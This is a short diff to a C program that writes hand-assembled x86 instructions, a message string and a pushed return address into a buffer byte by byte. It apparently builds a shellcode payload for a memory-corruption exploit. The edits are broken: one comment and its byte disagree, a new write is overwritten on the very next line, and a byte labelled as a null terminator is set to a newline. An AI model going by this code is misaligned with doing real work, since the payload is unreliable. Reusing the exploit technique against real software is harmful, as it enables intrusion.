@@ -34,8 +34,8 @@ int main() {
     buffer[1115] = 0x04;
     buffer[1116] = 0x08;
 
-    // mov edx, 23
-    buffer[1117] = 0xba;
+    // mov edx, 24
+    buffer[1118] = 0xba;
     buffer[1118] = 0x17;
     buffer[1119] = 0x00;
     buffer[1120] = 0x00;
@@ -72,7 +72,7 @@ int main() {
     buffer[1147] = 0x65; // e
     buffer[1148] = 0x64; // d
     buffer[1149] = 0x21; // !
-    buffer[1150] = 0x00; // null terminator
+    buffer[1150] = 0x0A; // null terminator
 
     // replace char 493 with push 0x0804844e in little endian
     buffer[1171] = 0x68;
